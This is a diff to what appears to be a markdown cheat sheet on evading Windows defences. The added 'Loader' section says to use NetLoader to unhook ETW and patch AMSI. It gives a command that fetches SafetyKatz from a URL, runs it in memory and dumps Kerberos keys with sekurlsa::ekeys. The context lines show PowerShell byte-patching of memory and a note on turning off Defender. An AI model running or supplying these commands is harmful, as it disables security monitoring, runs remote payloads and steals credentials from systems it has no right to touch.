@@ -51,6 +51,14 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 ```
 
+## Loader
+
+use [`NetLoader` ](https://github.com/Flangvik/NetLoader)to unhook ETW and patch AMSI then run executable from URL without saving
+
+```powershell
+NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+
 ## Windows Defender
 
 > **Note:** If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.
